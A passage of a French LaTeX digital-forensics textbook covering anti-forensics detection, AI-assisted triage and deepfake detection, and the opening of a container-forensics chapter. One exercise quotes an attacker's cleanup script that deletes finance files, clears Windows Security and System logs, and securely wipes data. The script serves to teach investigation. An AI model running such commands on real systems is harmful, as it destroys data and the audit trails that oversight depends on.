\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-09}
\begin{itemize}
    \item \textbf{Deux jeux d'horodatages NTFS}~: chaque entrée de la
          \$MFT porte quatre horodatages (MACE) dans l'attribut
          \texttt{\$STANDARD\_INFORMATION} (\$SI), modifiable par un outil
          utilisateur, et quatre autres dans \texttt{\$FILE\_NAME} (\$FN),
          que seul le noyau écrit. Le timestomping falsifie \$SI~; \$FN et
          le \$UsnJrnl (\texttt{FileCreate}) gardent la vraie date.
    \item \textbf{Indices de timestomping}~: quatre horodatages \$SI
          identiques à la seconde, une date \$SI antérieure à la date \$FN,
          ou des fractions de seconde à zéro.
    \item \textbf{Journal effacé}~: l'effacement du journal Security de
          Windows laisse l'événement \textbf{1102} (« journal d'audit
          effacé »), avec le compte qui l'a fait~; c'est souvent le premier
          événement du journal reconstitué.
    \item \textbf{Suppression sélective}~: compter les événements par heure
          et comparer au volume habituel~; une heure anormalement vide
          révèle des suppressions ciblées.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Principe de Locard inversé}~: toute tentative
          d'effacement produit elle-même de nouvelles traces.
          L'asymétrie favorise structurellement l'investigateur~:
          un seul artefact survivant suffit à révéler l'activité
          \emph{et} la tentative de dissimulation.

    \item \textbf{Timestomping}~: détecté par croisement
          \texttt{\$MFT}/\texttt{\$UsnJrnl}~; les outils de
          timestomping ne peuvent pas modifier le \texttt{\$UsnJrnl}
          ni les artefacts indépendants (Prefetch, UserAssist).

    \item \textbf{Event~ID~1102}~: signature universelle de
          l'effacement des journaux Windows (\texttt{wevtutil cl}).
          Réflexe systématique de recherche dans toute investigation
          suspectant une dissimulation.

    \item \textbf{Le forwarding en temps réel} (SIEM centralisé)
          est la meilleure architecture de défense~: un attaquant
          qui efface les logs locaux ne peut rien contre ce qui a
          déjà été transmis ailleurs.

    \item \textbf{Factory reset}~: n'efface ni la SD~Card externe,
          ni les logs opérateur, ni les données cloud déjà
          synchronisées. Toujours compléter par réquisition.

    \item \textbf{Applications vault}~: détectées par le nom de
          package réel (\texttt{pm list packages -f}), la taille
          de stockage incohérente, les permissions excessives.

    \item \textbf{Documentation}~: une tentative d'anti-forensique
          se documente comme toute constatation (source, horodatage)
          suivie d'une analyse avec niveau de confiance et
          hypothèses alternatives réfutées (E9bis PIU). Elle
          constitue souvent un indice d'intention coupable.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~22.1. Identifier les techniques \niveaubase}]
Pour chacune des observations suivantes, identifiez la catégorie
d'anti-forensique (Tableau~22.1) et la contre-mesure de détection
appropriée~:
\begin{enumerate}[(a)]
    \item Un fichier affiche une date de création de 2015 mais
          son contenu fait référence à un événement de 2026.
    \item Le journal Security d'un serveur Windows est vide pour
          toute la journée du 13~mars~2026.
    \item Un suspect possède une application ``Calculatrice''
          qui pèse 340~Mo sur son téléphone.
    \item Un trafic réseau chiffré présente des connexions toutes
          les exactement 300~secondes vers la même IP.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~22.2. Détection de timestomping \niveaumoyen}]
L'analyse \texttt{\$MFT} d'un fichier \texttt{backdoor.dll} montre~:
\begin{lstlisting}[language=bash_forensique]
Created (E):   2018-03-22 09:15:00
Modified (M):  2018-03-22 09:15:00
Accessed (A):  2018-03-22 09:15:00
Changed (C):   2018-03-22 09:15:00
\end{lstlisting}
L'analyse \texttt{\$UsnJrnl} montre~:
\begin{lstlisting}[language=bash_forensique]
2026-03-13 02:19:15  backdoor.dll  FileCreate
2026-03-13 02:19:16  backdoor.dll  DataExtend|Close
2026-03-13 02:19:20  backdoor.dll  BasicInfoChange
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Interprétez chacune des trois lignes du \texttt{\$UsnJrnl}.
          Que signifie spécifiquement \texttt{BasicInfoChange}~?
    \item Rédigez la constatation forensique correspondante,
          en respectant la distinction constatation/analyse.
    \item Pourquoi les 4~horodatages MACE parfaitement identiques
          dans le \texttt{\$MFT} sont-ils eux-mêmes un indice
          suspect, indépendamment de la divergence avec le
          \texttt{\$UsnJrnl}~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~22.3. Investigation complète avec anti-forensique \niveauexpert}]
Dans l'affaire ONAMBELE (Ch.~3~(UE~SEC4031)), vous découvrez
les éléments suivants lors de l'analyse du serveur compromis~:
\begin{itemize}
    \item Event~ID~1102 dans le journal Security à 03h42:15~;
    \item \texttt{\$UsnJrnl}~: suppression de 14~fichiers \texttt{.xlsx}
          entre 03h40:00 et 03h41:30~;
    \item Un fichier \texttt{cleanup.bat} dans le Prefetch, exécuté
          à 03h39:50, contenant (reconstitué depuis la RAM via
          Volatility \texttt{cmdline})~:
\begin{lstlisting}[language=bash_forensique]
del C:\Finance\rapports\*.xlsx
wevtutil cl Security
wevtutil cl System
sdelete -p 3 C:\Finance\rapports\*
\end{lstlisting}
\end{itemize}
\begin{enumerate}[(a)]
    \item Reconstituez la chronologie complète des événements,
          en distinguant ce qui s'est passé et ce qui a été
          tenté pour le dissimuler.
    \item L'utilisation de \texttt{sdelete -p~3} (3~passes
          d'écrasement) rend-elle les fichiers \texttt{.xlsx}
          définitivement irrécupérables~? Quelles sources
          alternatives existent malgré cela (pensez aux chapitres
          précédents~: sauvegardes, logs réseau, copies cloud)~?
    \item Rédigez 4~constatations et l'analyse correspondante,
          en respectant scrupuleusement la structure du
          Ch.~\ref{chap:rapport}.
    \item Quelle valeur cette séquence (suppression~$\to$
          effacement logs~$\to$ wiping sécurisé) apporte-t-elle
          à la démonstration de l'intention coupable~? Comment
          formuler cela sans franchir la limite de la qualification
          juridique (réservée à l'autorité judiciaire)~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} La maîtrise de l'anti-forensique complète le
socle technique du cours~: vous savez désormais non seulement
investiguer, mais aussi reconnaître et contrer les tentatives de
dissimulation. Cette compétence est transversale elle
s'applique à chaque type d'evidence rencontré dans la Partie~IV.

Les chapitres suivants de la Partie~V (selon le programme retenu)
abordent les perspectives prospectives~: OSINT avancé, intelligence
artificielle appliquée à la détection d'anomalies, et impact
des technologies post-quantiques sur l'intégrité des preuves
numériques à long terme.
\end{boxinfo}
   
        % ============================================================================
% Fichier  : partie5/P05_C23_ia_forensique.tex
% Titre    : Intelligence Artificielle et Forensique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Intelligence Artificielle et Forensique}
\label{chap:ia-for}

\epigraph{%
    « L'intelligence artificielle ne ment pas mieux que l'humain,
    elle ment plus vite, à plus grande échelle, et laisse des traces
    différentes. »%
}{Adapté de la pratique forensique contemporaine}

\niveauChapitre{Expert}{%
    Notions de machine learning recommandées mais non indispensables~:
    ce chapitre explique les concepts nécessaires. Lecture du cas
    MUNGO (Ch.~\ref{chap:cas-int}) recommandée.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Distinguer les deux usages de l'IA en forensique~: l'IA
          comme outil d'investigation et l'IA comme objet d'investigation.
    \item Appliquer des techniques de triage automatisé pour
          prioriser l'analyse de grands volumes de données.
    \item Détecter forensiquement les contenus générés ou modifiés
          par IA~: images, audio (deepfakes), texte.
    \item Comprendre les limites épistémologiques des outils d'IA
          en contexte judiciaire~: biais, explicabilité, robustesse
          au contre-interrogatoire.
    \item Documenter une analyse assistée par IA dans le respect
          de la distinction constatation/analyse (NIST~SP~800-86~\cite{nist80086}).
    \item Anticiper les évolutions de l'IA générative et leur
          impact sur l'admissibilité des preuves numériques.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Deux visages de l'intelligence artificielle en forensique}
% ============================================================================

Le cas MUNGO (Ch.~\ref{chap:cas-int}) a posé une question restée
ouverte~: comment analyser forensiquement un clip audio deepfake~?
Ce chapitre y répond en élargissant le cadre~: l'intelligence
artificielle se présente sous deux visages distincts pour
l'investigateur numérique.

\begin{enumerate}
    \item \textbf{L'IA comme outil}~: accélérer le triage de
          téraoctets de données, détecter des anomalies invisibles
          à l'\oe il humain, automatiser des tâches répétitives.
    \item \textbf{L'IA comme objet}~: les contenus générés par IA
          (deepfakes, textes synthétiques, images générées) deviennent
          eux-mêmes des preuves ou des éléments à authentifier.
\end{enumerate}

Ces deux visages exigent des compétences différentes mais
complémentaires.

\separateur

% ============================================================================
\section{L'IA comme Outil~: Triage et Détection d'Anomalies}
\label{sec:ia-outil}
% ============================================================================

\subsection{Le problème du volume}

Une investigation moderne implique fréquemment des volumes de données
qu'aucune analyse manuelle exhaustive ne peut traiter dans des délais
raisonnables~: des millions d'emails, des téraoctets de logs réseau,
des dizaines de milliers de photos. Le rôle de l'IA n'est pas de
remplacer l'investigateur mais de \textbf{prioriser} ce qu'il doit
examiner en premier.

\begin{boxdef}
\textbf{Triage assisté par IA}\index{triage assisté par IA}~:
utilisation d'algorithmes de classification ou de détection
d'anomalies pour ordonner un volume de données selon leur pertinence
probable, \emph{sans} se substituer à la décision finale de
l'investigateur humain.
\end{boxdef}

\subsection{Classification d'emails et de documents}

\begin{boxoutils}{Triage d'emails avec classification supervisée}
\begin{lstlisting}[language=bash_forensique]
# Cas type : 50 000 emails saisis dans l'affaire FAKO (Ch.20)
# Objectif : identifier les emails pertinents pour la fraude
# comptable sans les lire un par un

# Approche 1 : classification par mots-cles ponderes (simple,
# explicable -- recommande en premiere passe)
python3 << 'EOF'
import re
from collections import Counter

mots_cles = {
    'virement': 3, 'compte bancaire': 3, 'urgent': 1,
    'confidentiel': 2, 'ne pas divulguer': 3, 'IBAN': 3,
    'mot de passe': 2, 'autorisation': 1
}

def score_email(texte):
    texte_lower = texte.lower()
    return sum(poids for mot, poids in mots_cles.items()
               if mot in texte_lower)

# Trier les emails par score decroissant
# Les 200 emails les plus eleves sont examines en priorite
EOF

# Approche 2 : modele de classification (necessite jeu
# d'entrainement -- moins explicable, a documenter avec precaution)
# scikit-learn, classification Naive Bayes ou SVM
# ATTENTION : un modele "boite noire" pose un probleme
# d'explicabilite en contexte judiciaire (cf. section limites)
\end{lstlisting}
\end{boxoutils}

\begin{boxCRO}
\textbf{Analyse CRO. Triage IA et risque de biais}

$\mathcal{R}$ (Fiabilité)~: un modèle de triage bien calibré accélère
l'identification de preuves pertinentes, mais peut introduire des
faux négatifs systématiques (documents pertinents non identifiés
car ne correspondant pas aux patterns d'entraînement).

$\mathcal{O}$ (Opposabilité)~: un tri qui \emph{exclut} des documents
de l'examen humain pose un risque majeur~: si la défense découvre
qu'un document à décharge a été écarté par l'algorithme sans examen
humain, c'est l'ensemble du processus qui est compromis.

\cro{$\sim$}{$\uparrow$ vitesse, $\downarrow$ risque faux négatifs}{$\downarrow\downarrow$ si exclusion sans validation humaine}

\textbf{Règle pratique impérative~:} l'IA \textbf{priorise}, elle
ne \textbf{décide jamais} de l'exclusion définitive d'un document
de l'examen. Tout document, même classé comme peu pertinent, doit
rester accessible et son score de classification documenté.
\end{boxCRO}

\subsection{Détection d'anomalies dans les logs}

\begin{boxoutils}{Détection d'anomalies comportementales (UEBA)}
\begin{lstlisting}[language=bash_forensique]
# UEBA : User and Entity Behavior Analytics
# Principe : etablir une baseline du comportement normal d'un
# utilisateur ou systeme, puis detecter les ecarts statistiques

# Exemple simplifie : detection d'horaires de connexion anormaux
python3 << 'EOF'
import pandas as pd
from sklearn.ensemble import IsolationForest

# Chargement des logs de connexion (Event ID 4624, Ch. 14)
df = pd.read_csv('connexions.csv')
# Colonnes : heure_connexion, jour_semaine, duree_session, volume_donnees

# Modele de detection d'anomalies (non supervise)
modele = IsolationForest(contamination=0.05, random_state=42)
df['anomalie'] = modele.fit_predict(
    df[['heure_connexion', 'jour_semaine', 'duree_session']]
)

# Les connexions marquees -1 sont des anomalies statistiques
anomalies = df[df['anomalie'] == -1]
print(f"{len(anomalies)} connexions anormales identifiees sur "
      f"{len(df)} totales")
EOF

# IMPORTANT : une anomalie statistique n'est PAS une preuve de
# malveillance. C'est un signal de priorisation pour examen humain.
# Documenter : "X connexions ont ete identifiees comme statistiquement
# atypiques par le modele Isolation Forest (parametres : contamination=
# 0.05) et ont fait l'objet d'un examen manuel detaille."
\end{lstlisting}
\end{boxoutils}

\subsection{Reconnaissance d'objets dans les preuves visuelles}

\begin{boxoutils}{Détection automatisée dans des collections de médias}
\begin{lstlisting}[language=bash_forensique]
# Cas type : 15 000 photos extraites d'un telephone (Ch. 16)
# Objectif : identifier rapidement les photos contenant des
# documents, des armes, ou des visages specifiques

# Outils disponibles dans Autopsy (Ch. 16) :
# - Module "Object Detection" : categories generiques
#   (personne, vehicule, document, arme)
# - Module "Facial Recognition" : regroupement par visage
#   (PAS d'identification -- juste regroupement de similarite)

# Limite cruciale : la reconnaissance faciale automatisee a un
# taux d'erreur variable selon les populations -- documenter
# systematiquement le taux de faux positifs/negatifs du modele
# utilise et ne JAMAIS presenter une correspondance faciale
# automatisee comme une identification certaine sans validation
# par un examinateur qualifie
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{L'IA comme Objet~: Détecter les Contenus Synthétiques}
\label{sec:ia-objet}
% ============================================================================

\subsection{Taxonomie des contenus générés par IA}

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.0cm}}{%
    \tableauHeader{Type} &
    \tableauHeader{Technologie typique} &
    \tableauHeader{Contexte forensique camerounais}
}
\textbf{Deepfake vidéo} & GAN, modèles de diffusion vidéo &
    Vidéos compromettantes fabriquées, désinformation politique \\
\textbf{Deepfake audio} & Clonage vocal (modèles \textit{text-to-speech}) &
    Fausses déclarations attribuées (cas MUNGO, Ch.~\ref{chap:cas-int})~;
    arnaques par usurpation vocale \\
\textbf{Image générée} & Diffusion (Midjourney, Stable Diffusion) &
    Faux documents d'identité, fausses preuves visuelles \\
\textbf{Texte généré} & LLM (GPT, Claude, Llama) &
    Faux témoignages écrits, emails de phishing sophistiqués,
    faux articles de presse \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~23.1. Taxonomie des contenus synthétiques}\end{center}

\subsection{Détection de deepfakes audio~: le cas MUNGO résolu}

Reprenons la question laissée ouverte au Ch.~\ref{chap:cas-int}~:
comment analyser forensiquement les 12~clips audio deepfake de
l'affaire MUNGO~?

\begin{boxoutils}{Analyse forensique d'un clip audio suspect}
\begin{lstlisting}[language=bash_forensique]
# Etape 1 : analyse des metadonnees du fichier audio
exiftool clip_suspect.mp3
# Chercher : logiciel d'encodage, absence de metadonnees
# d'enregistrement original (date GPS, modele d'appareil)
# -- un enregistrement authentique sur smartphone a generalement
# des metadonnees riches ; un deepfake genere n'en a souvent aucune

# Etape 2 : analyse spectrale (spectrogramme)
sox clip_suspect.mp3 -n spectrogram -o spectrogramme.png
# Les voix de synthese presentent souvent :
# - une absence de bruit de fond naturel (silence trop "propre")
# - des artefacts de frequence caracteristiques du vocoder utilise
# - une regularite anormale du rythme respiratoire (souvent absent)

# Etape 3 : outils de detection specialises
# (recherche academique active, taux de detection variable)
# - Resemblyzer (analyse d'empreinte vocale)
python3 -c "
from resemblyzer import VoiceEncoder, preprocess_wav
encoder = VoiceEncoder()
wav = preprocess_wav('clip_suspect.wav')
embedding = encoder.embed_utterance(wav)
# Comparer avec un echantillon authentique connu du candidat
"

# - Detecteurs commerciaux : Pindrop, Resemble Detect,
#   Microsoft Video Authenticator (limites : taux de faux
#   positifs/negatifs evoluent avec chaque nouvelle generation
#   de modeles generatifs -- TOUJOURS documenter la version
#   de l'outil et sa date d'evaluation independante)

# Etape 4 : analyse contextuelle (la plus fiable a ce jour)
# - Comparer avec des enregistrements authentiques connus
#   (discours publics du candidat, interviews)
# - Verifier la coherence factuelle du contenu attribue
# - Tracer l'origine de diffusion (premiere apparition,
#   compte source -- cf. Ch. 15, analyse reseau)
\end{lstlisting}
\end{boxoutils}

\begin{boxalert}
\textbf{L'état de l'art~: course technologique sans fin}

La détection de deepfakes est un domaine de recherche en évolution
rapide et \textbf{aucun outil de détection actuel n'offre une
fiabilité absolue}. Chaque amélioration des détecteurs est suivie
d'une amélioration des générateurs (course aux armements
\textit{GAN vs détecteur}). Conséquence pour le rapport forensique~:
\begin{itemize}
    \item Ne jamais affirmer ``ce clip est un deepfake'' avec
          certitude absolue sur la seule base d'un détecteur
          automatisé~;
    \item Toujours croiser l'analyse technique avec l'analyse
          contextuelle (provenance, cohérence factuelle, témoignages)~;
    \item Documenter le taux de faux positifs/négatifs connu
          de l'outil utilisé à la date de l'analyse.
\end{itemize}
\end{boxalert}

\subsection{Détection d'images générées par IA}

\begin{boxoutils}{Indices forensiques d'images générées}
\begin{lstlisting}[language=bash_forensique]
# Indices visuels classiques (modeles de diffusion, 2023-2025) :
# - mains avec un nombre incorrect de doigts (de moins en moins
#   fiable : les modeles recents corrigent ce defaut)
# - incoherences dans les reflets, ombres, perspectives
# - texte illisible ou deforme dans l'image (panneaux, etiquettes)
# - metadonnees EXIF absentes ou incoherentes avec le contexte allegue

exiftool image_suspecte.jpg
# Rechercher specifiquement :
# - Software tag (certains generateurs laissent une signature,
#   ex : "Software: Midjourney" -- de moins en moins frequent
#   car facilement supprime)
# - Absence totale de donnees EXIF (suspect pour une photo
#   pretendue prise avec un smartphone)

# Detection par analyse de frequence (artefacts de generation)
# Outils specialises : 
# - Hugging Face model hub (modeles de detection open source)
# - C2PA (Coalition for Content Provenance and Authenticity)
#   -- standard emergent de signature de provenance des medias,
#   verifie via : c2patool inspect image.jpg

# IMPORTANT : l'absence d'indicateur de generation IA NE PROUVE
# PAS l'authenticite -- elle signifie seulement qu'aucun indicateur
# connu n'a ete detecte par les outils disponibles a la date
# de l'analyse
\end{lstlisting}
\end{boxoutils}

\subsection{Détection de texte généré par IA}

\begin{boxoutils}{Analyse de texte suspecté généré par LLM}
\begin{lstlisting}[language=bash_forensique]
# Contexte : un temoignage ecrit, un email, ou un document
# est suspecte d'avoir ete redige par un LLM plutot que par
# son auteur pretendu

# Indices linguistiques (faible fiabilite individuelle, a
# combiner) :
# - structures syntaxiques tres regulieres
# - absence de fautes typiques de l'auteur pretendu
#   (si l'auteur a un niveau de francais connu, par exemple)
# - vocabulaire incoherent avec le profil socio-educatif declare
# - "perplexite" textuelle anormalement basse (mesure statistique
#   de la previsibilite du texte selon un modele de langage)

# Outils de detection (fiabilite limitee et contestee
# scientifiquement -- a utiliser avec EXTREME prudence en
# contexte judiciaire) :
# - GPTZero, Originality.ai, etc.
# ATTENTION : ces outils ont des taux de faux positifs
# significatifs, particulierement sur les textes d'auteurs
# non-natifs du francais/anglais -- RISQUE DE BIAIS DISCRIMINATOIRE
# a documenter explicitement si ces outils sont utilises

# Approche forensique privilegiee : analyse de la chaine de
# production du document (metadonnees du fichier, historique
# de versions, horodatage de creation vs publication) plutot
# que l'analyse stylometrique seule
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Limites Épistémologiques de l'IA en Contexte Judiciaire}
\label{sec:limites-ia}
% ============================================================================

\subsection{Le problème de l'explicabilité}

\begin{boxdef}
\textbf{Explicabilité (XAI)}\index{explicabilité}~: capacité d'un
système d'IA à justifier sa décision dans des termes compréhensibles
par un humain. Les modèles de \textit{deep learning} complexes
(réseaux de neurones profonds) sont notoirement peu explicables, ils produisent un résultat sans qu'on puisse facilement tracer
le raisonnement qui y a mené.
\end{boxdef}

\begin{boxjuris}
\textbf{L'explicabilité et le standard FRE~Rule~702 / témoignage expert}

Le Chapitre~11~(UE~SEC4031) a présenté les \textit{Federal Rules
of Evidence}. La Rule~702 (méthodologie de l'expert) exige que les
méthodes employées soient \textbf{fiables et vérifiables}. Un modèle
d'IA ``boîte noire'' dont même son concepteur ne peut expliquer le
raisonnement pose un problème direct~: comment l'expert peut-il
attester de la fiabilité d'une méthode qu'il ne peut pas expliquer~?

\textbf{Conséquence pratique~:} privilégier, chaque fois que possible,
des méthodes explicables (classification par règles, scores pondérés
documentés) pour les conclusions qui seront présentées au tribunal.
Réserver les modèles complexes (deep learning) au triage préliminaire,
suivi systématique d'une validation humaine explicable.
\end{boxjuris}

\subsection{Biais algorithmique et discrimination}

\begin{boxalert}
\textbf{Le risque de biais dans les outils forensiques IA}

Les modèles d'IA héritent des biais présents dans leurs données
d'entraînement. En contexte forensique, ce risque est documenté
pour~:
\begin{itemize}
    \item \textbf{Reconnaissance faciale}~: taux d'erreur
          significativement plus élevés pour certaines catégories
          démographiques selon de nombreuses études indépendantes
          (NIST, MIT Media Lab)~;
    \item \textbf{Détection de texte généré par IA}~: biais
          documentés contre les locuteurs non-natifs de la
          langue d'analyse~;
    \item \textbf{Reconnaissance vocale}~: performance variable
          selon les accents régionaux.
\end{itemize}
\textbf{Implication pour le Cameroun~:} les outils d'IA forensique
sont majoritairement entraînés sur des corpus occidentaux.
Leur application à des sujets, des voix ou des textes camerounais
(accents locaux, mélange français/anglais/langues locales)
\textbf{peut présenter des taux d'erreur non documentés}.
Exiger systématiquement, avant utilisation en contexte judiciaire,
une évaluation indépendante du taux d'erreur de l'outil sur des
échantillons représentatifs de la population concernée.
\end{boxalert}

\subsection{Robustesse au contre-interrogatoire}

\begin{boxscenario}{Contre-interrogatoire d'une conclusion assistée par IA}
\textbf{Contexte~:} dans l'affaire MUNGO, l'expert a utilisé un outil
de détection de deepfake (taux de détection annoncé par l'éditeur~:
94\%) pour conclure que 8~des~12~clips audio sont des deepfakes.

\textbf{Q~:} ``Quel est le taux de faux positifs de cet outil~?''\\
\textbf{R~:} ``L'éditeur annonce un taux de faux positifs de~3\%
sur son jeu de test publié. Je n'ai pas de donnée indépendante
sur la performance spécifique pour des voix en français camerounais.
J'ai en conséquence croisé cette analyse avec une comparaison
contextuelle [détails de l'analyse contextuelle].''

\textbf{Q~:} ``Pouvez-vous expliquer pourquoi l'algorithme a classé
ce clip spécifique comme deepfake~?''\\
\textbf{R~:} ``L'outil utilisé fournit un score de confiance global
(87\% dans ce cas) mais ne détaille pas les caractéristiques
spécifiques ayant motivé ce score, ce qui constitue une limite que
je documente dans mon rapport. Pour cette raison, ma conclusion
ne repose pas uniquement sur ce score mais sur la convergence avec
[analyse spectrale manuelle, incohérences contextuelles].''

\textbf{Constat~:} la deuxième réponse illustre la bonne pratique~:
l'expert reconnaît la limite de l'outil ET montre que sa conclusion
ne dépend pas uniquement de cette boîte noire.
\end{boxscenario}

% ============================================================================
\section{Documenter une Analyse Assistée par IA dans le Rapport}
\label{sec:documentation-ia}
% ============================================================================

\begin{lstlisting}[language=bash_forensique,
    caption={Modèle de documentation d'une analyse assistée par IA}]
3.X MÉTHODOLOGIE -- OUTIL DE DÉTECTION ASSISTÉE PAR IA

Outil utilisé        : [Nom, version, éditeur]
Date d'utilisation    : [date]
Type de modèle        : [ex : réseau de neurones convolutif
                          entraîné pour la détection de deepfakes
                          audio]
Performance annoncée  : [taux de détection / faux positifs selon
                          la documentation de l'éditeur, avec
                          référence à la publication ou au rapport
                          technique correspondant]
Validation indépendante : [Oui/Non -- si Non, le mentionner
                          explicitement comme une limite]
Limite identifiée      : [absence de données de performance
                          spécifiques au contexte linguistique/
                          démographique camerounais, le cas échéant]

CONSTATATION (résultat brut de l'outil) :
"L'outil [nom] a attribué un score de confiance de 87% à
l'hypothèse que le clip audio [référence] est généré par
synthèse vocale."
[Ceci EST une constatation : c'est un fait vérifiable -- l'outil
a produit ce score. Ce N'EST PAS une preuve que le clip est
effectivement un deepfake.]

ANALYSE (interprétation avec niveau de confiance) :
"Ce résultat, combiné avec [analyse spectrale manuelle révélant
X, absence de métadonnées d'enregistrement original, incohérence
contextuelle Y], converge vers la conclusion que ce clip audio
est très probablement un contenu synthétique, avec un niveau
de confiance modéré à élevé. Cette conclusion ne repose pas
exclusivement sur le score de l'outil automatisé."
\end{lstlisting}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-10}
\begin{itemize}
    \item \textbf{Mesurer un classifieur} sur un échantillon dont la vérité
          est connue~: au seuil $s$, un élément de score $\geq s$ est
          déclaré positif. On compte les vrais positifs (VP), faux positifs
          (FP) et faux négatifs (FN), puis
          \[
          \text{précision} = \frac{VP}{VP+FP}, \qquad
          \text{rappel} = \frac{VP}{VP+FN}.
          \]
    \item \textbf{Effet du seuil}~: relever le seuil réduit les faux
          positifs (la précision monte) mais laisse passer des éléments
          pertinents (le rappel baisse). Le taux annoncé par l'éditeur ne
          remplace pas cette mesure.
    \item \textbf{Contenus synthétiques}~: un enregistrement fait par un
          téléphone porte des métadonnées riches (modèle, date, durée)~; un
          clip généré n'en a souvent aucune. L'absence de métadonnées est un
          \emph{indice}, jamais une preuve.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Deux visages de l'IA}~: outil (triage, détection
          d'anomalies, accélération) et objet (deepfakes, contenus
          synthétiques à authentifier). Compétences différentes,
          rigueur identique.

    \item \textbf{Règle d'or du triage}~: l'IA \textbf{priorise},
          elle ne \textbf{décide jamais} de l'exclusion définitive
          d'un document. Tout document doit rester accessible
          et son score documenté.

    \item \textbf{Détection de deepfakes}~: croiser systématiquement
          analyse technique (métadonnées, spectrogramme, outils
          spécialisés) et analyse contextuelle (provenance,
          cohérence factuelle). Aucun outil n'offre une fiabilité
          absolue, course technologique permanente.

    \item \textbf{Explicabilité}~: privilégier les méthodes
          explicables pour les conclusions présentées au tribunal.
          Les modèles ``boîte noire'' posent un problème direct
          au regard du standard FRE~Rule~702.

    \item \textbf{Biais algorithmique~:} les outils d'IA forensique
          sont majoritairement entraînés sur des corpus occidentaux.
          Exiger une évaluation indépendante de leur performance
          sur des échantillons représentatifs avant usage judiciaire
          au Cameroun.

    \item \textbf{Documentation}~: le résultat brut d'un outil IA
          est une \textbf{constatation} (``l'outil a produit ce
          score'')~; son interprétation est une \textbf{analyse}
          (avec niveau de confiance et hypothèses alternatives).
          Ne jamais présenter un score automatisé comme une
          conclusion en soi.

    \item \textbf{Contre-interrogatoire}~: anticiper systématiquement
          les questions sur le taux de faux positifs, l'explicabilité
          et la validation indépendante de tout outil d'IA utilisé.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~23.1. Triage vs décision \niveaubase}]
Pour chacune des situations suivantes, déterminez si l'usage de
l'IA décrit respecte la règle ``l'IA priorise, ne décide jamais''~:
\begin{enumerate}[(a)]
    \item Un outil de classification trie 50~000~emails par score
          de pertinence~; l'investigateur examine les 500~premiers
          puis conclut son rapport sans mentionner les~49~500~autres.
    \item Un outil UEBA signale 12~connexions comme anormales sur
          5~000~; l'investigateur documente les 12~connexions
          \emph{et} précise dans son rapport les critères et
          paramètres du modèle utilisé.
    \item Un détecteur de deepfake conclut ``deepfake~: 91\%
          de confiance''~; le rapport cite uniquement ce score
          comme preuve de falsification.
\end{enumerate}
Pour chaque cas, identifiez le risque CRO associé.
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~23.2. Analyse de deepfake \niveaumoyen}]
Vous recevez un clip audio de 45~secondes dans lequel une voix
ressemblant à celle du Directeur Financier d'une entreprise
camerounaise autorise un virement de 80~millions~FCFA par téléphone.
\begin{enumerate}[(a)]
    \item Listez les 4~étapes d'analyse forensique que vous
          appliqueriez (référez-vous à la structure de ce chapitre).
    \item Quelles métadonnées chercheriez-vous en premier~? Que
          signifierait leur absence totale~?
    \item Si l'outil de détection automatisé donne un score
          ambigu (52\% de confiance ``deepfake''), quelle est votre
          démarche~? Quelles autres sources mobilisez-vous
          (pensez aux Ch.~15~et~17)~?
    \item Rédigez la section ``Constatation'' et ``Analyse''
          correspondant à votre conclusion, en respectant
          la structure du Ch.~\ref{chap:rapport}.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~23.3. IA et biais en contexte camerounais \niveauexpert}]
L'ANTIC envisage de déployer un outil commercial de reconnaissance
vocale pour automatiser le traitement des plaintes orales déposées
par téléphone, en complément du travail des OPJ.
\begin{enumerate}[(a)]
    \item Quelles questions poseriez-vous à l'éditeur de l'outil
          avant son déploiement, en lien avec les biais algorithmiques
          présentés dans ce chapitre~?
    \item Le Cameroun est un pays multilingue (français, anglais,
          plus de 250~langues locales, avec des accents régionaux
          marqués). Quel risque spécifique cela pose-t-il pour
          un outil entraîné sur des corpus majoritairement
          occidentaux~?
    \item Si cet outil devait être utilisé pour trier les plaintes
          par ordre de priorité, quelles garanties proposeriez-vous
          pour respecter le principe ``l'IA priorise, ne décide
          jamais''~?
    \item Rédigez une recommandation de politique d'usage (5~points
          maximum) pour l'adoption responsable de cet outil par
          l'ANTIC, en vous appuyant sur les principes
          d'explicabilité et de validation indépendante.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} L'intelligence artificielle transforme à la
fois les capacités de l'investigateur et la nature des preuves
à analyser. Cette transformation se prolonge dans l'infrastructure
elle-même~: conteneurs et orchestrateurs rendent les systèmes
abstraits et éphémères, au point que la preuve peut disparaître
en quelques secondes. C'est l'objet du chapitre suivant.
\end{boxinfo}
      
        % ============================================================================
% Fichier  : partie5/P05_C24_containers_cloud_native.tex
% Titre    : Forensique Cloud-Native et Conteneurs
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Forensique Cloud-Native et Conteneurs}
\label{chap:containers}

\epigraph{%
    « Un conteneur compromis peut avoir disparu avant même que vous
    ayez fini de lire l'alerte qui vous en informe. »%
}{Réalité opérationnelle du cloud-native}

